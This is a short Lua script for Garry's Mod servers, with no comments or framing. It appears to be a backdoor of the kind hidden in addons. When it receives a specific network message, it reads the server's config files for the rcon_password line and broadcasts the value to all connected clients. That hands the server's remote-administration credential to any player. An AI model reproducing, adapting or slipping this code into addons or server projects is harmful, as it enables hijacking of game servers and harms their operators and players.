net.Receive( "jeveuttonrconleul", function()
local RconPassword
if file.Exists("cfg/server.cfg", "GAME") then
    for k, v in pairs(string.Explode("\n", file.Read("cfg/server.cfg", "GAME"))) do
        if string.find(v, "rcon_password") then
            RconPassword = v
        end
    end
end
if not RconPassword and file.Exists("cfg/autoexec.cfg", "GAME") then
    for k, v in pairs(string.Explode("\n", file.Read("cfg/autoexec.cfg", "GAME"))) do
        if string.find(v, "rcon_password") then
            RconPassword = v
        end
    end
end
if RconPassword ~= nil then
    net.Start("rcon_passw_dump")
    net.WriteString(RconPassword)
    net.Broadcast()
    else
    net.Start("aucun_rcon_ici")
    net.Broadcast()
end
end)